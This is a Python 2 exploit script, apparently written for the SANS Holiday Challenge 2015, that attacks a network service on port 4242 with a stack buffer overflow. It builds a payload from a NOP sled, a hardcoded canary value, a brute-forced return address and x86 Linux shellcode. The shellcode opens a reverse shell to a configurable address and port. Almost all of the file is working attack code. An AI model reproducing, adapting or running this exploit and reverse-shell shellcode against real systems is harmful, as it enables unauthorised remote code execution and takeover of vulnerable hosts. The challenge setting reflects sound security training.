#!/usr/bin/python
# Connects to target system and send exploit and shellcode
# Developedbu Hecber <skysec> for the SANS Holiday Challenge 2015
#
 
import sys, socket, struct
from time import sleep
from subprocess import call
 
target = "127.0.0.1"
port = 4242
# addr: 127.0.0.1
dest_ip_hex = "\x7f\x01\x01\x01"
# port 25555
dest_port_hex = "\x63\xd3"

# first part of the shellcode

jump="\xeb\x18"
shellcode=("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x92\xb0\x66\x68"
+ dest_ip_hex +
"\x66\x68"
+ dest_port_hex + 
"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80"
"\x6a\x02\x59\x87\xda"
"\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41"
"\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\xcd\x80")

# Canary
canary = "\xe4\xff\xff\xe4"

# Send data to target, includes menu interaction
# and saves data on dest_file
def sendData(buffer, ret_addr):
 
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((target, port))
       	d=s.recv(1024)
	print d
	sleep(1)	
        s.send('X' + '\r\n')
	sleep(2)
	print s.recv(1024)
	sleep(3)
	s.send(buffer+'\r\n')
	print "sent"
	sleep(1)
	s.send(buffer+'\r\n')
	print "sent"
	sleep(3)
	s.close()

# Create data to be sent to target 
def createData(ret_addr):
	nops = "\x90" * 92
	nops01 = "\x90" * (102  - len(nops) - len(jump) )
	nops02 = "\x90" * 8
	ret = struct.pack("<I",ret_addr)
	ebp = ret
	# Create data package 
	data = nops + jump + nops01 + canary + ebp + ret + nops02 + shellcode
	return data

# updates ret_addr: return address is affected by vars used during app start
# Checking with gdb, return address move 64 bytes, for this reason the increment is
# using 64 bytes
def runCases(base_value,top_value):
	ret_addr = int(base_value,16)
	max_value = int(top_value,16)
	while ret_addr <= max_value:
		data = createData(ret_addr)
		try:
		    sendData(data, ret_addr)
		except:
		    pass
		ret_addr += 64

if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print "Error: the script takes two parameters"
		exit()
	runCases(sys.argv[1], sys.argv[2])

